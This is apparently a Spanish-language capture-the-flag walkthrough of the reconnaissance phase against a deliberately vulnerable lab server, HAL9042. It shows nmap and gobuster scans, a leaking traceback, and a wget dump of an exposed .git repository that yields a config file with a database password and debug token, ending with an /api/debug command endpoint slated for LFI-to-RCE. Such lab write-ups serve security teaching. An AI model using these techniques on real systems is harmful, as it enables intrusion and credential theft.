# Reconnaisance
## Host Discovery - T1595  Active Scanning 



```bash
nmap -sn 10.1.0.1/28
Starting Nmap 7.92 ( https://nmap.org ) at 2026-08-05 17:41 CEST
Nmap scan report for fedora (10.1.0.1)
Host is up (0.00013s latency).
Nmap scan report for 10.1.0.8
Host is up (0.00026s latency).
Nmap done: 16 IP addresses (2 hosts up) scanned in 1.73 seconds
```

```bash
sudo nmap -p- -sV -sC 10.1.0.8
Starting Nmap 7.92 ( https://nmap.org ) at 2026-08-05 17:41 CEST
Nmap scan report for 10.1.0.8
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
5042/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-robots.txt: 10 disallowed entries
| /api/debug /static/js/debug.js /api/internal/ /beta/
| /flag /flag.txt /admin /the_real_flag_is_in_here
|_/definitely_not_a_trap /secret_backup_DO_NOT_READ
|_http-title: HAL9042 \xE2\x80\x94 Evaluation Server
| http-git:
|   10.1.0.8:5042/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     .git/COMMIT_EDITMSG matched patterns 'bug'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: remove debug config before launch
|_http-server-header: nginx/1.24.0 (Ubuntu)
6060/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 24:28:b9:a5:9a:c8:c5:48:3a:f0:d1:7c:df:94:58:59 (ECDSA)
|_  256 05:44:58:ab:f2:e9:79:25:93:e4:13:3f:8f:df:a0:90 (ED25519)
MAC Address: 52:54:00:12:34:56 (QEMU virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 

```

### Fingerprinting

```bash
curl 10.1.0.8:5042 -I
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Wed, 05 Aug 2026 15:44:23 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1769
Connection: keep-alive
X-Powered-By: HAL9042/0.4 (Flask)
X-HAL9042-Env: development
X-Eval-Backend: hal9042d:7042

```

### Webserver metafiles

```bash
curl 10.1.0.8:5042/robots.txt
User-agent: *
# paco: all of these were removed before launch. definitely. don't try them.
Disallow: /api/debug            # removed, returns 404 now
Disallow: /static/js/debug.js   # leftover, does nothing
Disallow: /api/internal/
Disallow: /beta/
Disallow: /flag
Disallow: /flag.txt
Disallow: /admin                # HAL is the only admin now
Disallow: /the_real_flag_is_in_here
Disallow: /definitely_not_a_trap
Disallow: /secret_backup_DO_NOT_READ
# HAL9042 reminds you: curiosity is logged. (it is always logged.)
```

### 

```bash
root@ee0039bcd358:/opt/gobuster# ./gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.1.0.8:5042/ -r  -x php,txt  -t 4
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.1.0.8:5042/
[+] Method:                  GET
[+] Threads:                 4
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
about                (Status: 200) [Size: 1765]
admin                (Status: 403) [Size: 116]
administrator        (Status: 403) [Size: 116]
appeals              (Status: 200) [Size: 1466]
appeal               (Status: 200) [Size: 1895]
backup               (Status: 200) [Size: 164]
evaluate             (Status: 200) [Size: 1500]
feed                 (Status: 200) [Size: 1759]
flag                 (Status: 200) [Size: 242]
flag.txt             (Status: 200) [Size: 242]
robots.txt           (Status: 200) [Size: 518]
robots.txt           (Status: 200) [Size: 518]
status               (Status: 200) [Size: 1591]
Progress: 61407 / 61407 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
root@ee0039bcd358:/opt/gobuster# ./gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.1.0.8:5042/beta -r  -x php,txt  -t 4
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.1.0.8:5042/beta
[+] Method:                  GET
[+] Threads:                 4
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
evaluate             (Status: 500) [Size: 444]
Progress: 61407 / 61407 (100.00%)
===============================================================
Finished
===============================================================
```

/api/ solo nos retorna debug.

Vemos el 500:
```bash
 curl -v 10.1.0.8:5042/beta/evaluate
*   Trying 10.1.0.8:5042...
* Connected to 10.1.0.8 (10.1.0.8) port 5042
* using HTTP/1.x
> GET /beta/evaluate HTTP/1.1
> Host: 10.1.0.8:5042
> User-Agent: curl/8.11.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 500 INTERNAL SERVER ERROR
< Server: nginx/1.24.0 (Ubuntu)
< Date: Thu, 06 Aug 2026 18:41:01 GMT
< Content-Type: text/plain; charset=utf-8
< Content-Length: 444
< Connection: keep-alive
< X-Powered-By: HAL9042/0.4 (Flask)
< X-HAL9042-Env: development
< X-Eval-Backend: hal9042d:7042
<
Traceback (most recent call last):
  File "/var/www/hal9042/app.py", line 999, in beta_evaluate
    score = backend.evaluate(project)  # /api/internal/schema
Traceback (most recent call last):
  File "/var/www/hal9042/app.py", line 183, in beta_evaluate
    raise RuntimeError(
RuntimeError: evaluator backend unreachable: hal9042d@127.0.0.1:7042 (see /api/internal/schema)

Internal paths: /var/www/hal9042 , /opt/hal9042/ , /var/log/hal9042/

```

Tenemos un error sin controlar desde la aplicación, un traceback que nos desvela el directorio en donde se encuentra la aplicación en el servidor,
otra nueva ruta y un servicio interno `127.0.0.1:7042` (al cual no tenemos acceso desde el exterior). (X-Eval-Backend)

```bash
curl -v 10.1.0.8:5042/api/internal/schema

*   Trying 10.1.0.8:5042...
* Connected to 10.1.0.8 (10.1.0.8) port 5042
* using HTTP/1.x
> GET /api/internal/schema HTTP/1.1
> Host: 10.1.0.8:5042
> User-Agent: curl/8.11.1
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx/1.24.0 (Ubuntu)
< Date: Thu, 06 Aug 2026 18:43:13 GMT
< Content-Type: application/json
< Content-Length: 168
< Connection: keep-alive
< X-Powered-By: HAL9042/0.4 (Flask)
< X-HAL9042-Env: development
< X-Eval-Backend: hal9042d:7042
<
{"host":"127.0.0.1","note":"debug command handler still enabled \u2014 paco","port":7042,"render_debug_header":"X-Debug-Render","service":"hal9042d","transport":"tcp"}
* Connection #0 to host 10.1.0.8 left intact
```

Crawling:

```bash 
root@15485da21b1b:/opt/gobuster# katana -u http://10.1.0.8:5042 -jc

   __        __
  / /_____ _/ /____ ____  ___ _
 /  '_/ _  / __/ _  / _ \/ _  /
/_/\_\\_,_/\__/\_,_/_//_/\_,_/

                projectdiscovery.io

[INF] Current katana version v1.7.0 (latest)
[INF] Started standard crawling for => http://10.1.0.8:5042
http://10.1.0.8:5042
http://10.1.0.8:5042/static/js/main.js
http://10.1.0.8:5042/static/js/glitch.js
http://10.1.0.8:5042/about
http://10.1.0.8:5042/static/css/glitch.css
http://10.1.0.8:5042/appeals
http://10.1.0.8:5042/status
http://10.1.0.8:5042/feed
http://10.1.0.8:5042/evaluate
http://10.1.0.8:5042/appeal
[INF] Crawl completed in 12s. 10 endpoints found.

```

### Lo de .git

```bash

 wget -r -np -nH --cut-dirs=1 http://10.1.0.8:5042/.git/
```


`git status` nos muestra que el repositorio ha sido limpiado pero no se han commiteado los cambios, así que recuperamos el proyecto con `git restore`.

Tenemos ahora el código fuente del servidor web, por lo que podemos hacer un análisis `grey box` para detectar vulnerabilidades explotables.

Por lo pronto obtenemos el archivo de configuración del servidor `config.py`, con variables de entorno interesantes.

```python 
# HAL9042 web frontend — configuration
# -------------------------------------
# paco: do NOT commit this with real values again. (it was committed. twice.)

DB_HOST = "127.0.0.1"
DB_NAME = "hal9042"
DB_USER = "hal9042"
DB_PASS = "Moulinette2024!"

SECRET_KEY = "hal9042secret"

# Internal maintenance token. The /api/debug console accepts this token to run
# diagnostic commands. Was supposed to be rotated before launch.
ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"

# Legacy debug endpoint. "removed" in a later commit (see git log) but the route
# is still wired in app.py.
DEBUG_ENDPOINT = "/api/debug"
ENV = "development"
```

La variable `ADMIN_TOKEN` nos servirá para obtener shell como `www-data` a través de **LFI -> RCE**.

### Primera ruta

```
root@15485da21b1b:/opt/gobuster# curl 10.1.0.8:5042/api/debug
HAL9042 debug endpoint.
usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
```


### Segunda ruta

```
root@15485da21b1b:/opt/gobuster# curl 10.1.0.8:5042/api/debug
HAL9042 debug endpoint.
usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
root@15485da21b1b:/opt/gobuster# curl 10.1.0.8:5042/static/js/debug.js
// static/js/debug.js
// paco: internal debug helper. NEVER linked from any template — leftover.
// (found via the exposed .git repo or by dirbusting /static/js/)
window.HAL_DEBUG = {
    // Setting this request header switches /evaluate into verbose render mode,
    // so the Jinja2-rendered output is returned instead of the opaque ack.
    debug_header: "X-Debug-Render",
    schema_endpoint: "/api/internal/schema",
    // legacy maintenance console — disabled in the UI, still on the server
    debug_endpoint: "/api/debug",
    note: "X-Debug-Render: true  ->  see what the template engine actually rendered"
};
```